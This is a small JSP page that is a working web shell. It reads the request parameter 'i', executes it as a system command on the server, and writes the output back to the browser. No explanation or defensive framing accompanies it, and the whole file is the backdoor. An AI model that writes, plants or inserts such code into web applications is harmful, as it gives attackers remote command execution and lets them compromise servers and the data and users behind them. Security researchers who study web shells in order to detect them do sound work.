<%
	java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
	int a = -1;
	byte[] b = new byte[2048];
	while((a=in.read(b))!=-1){
		out.println(new String(b));
	}
%>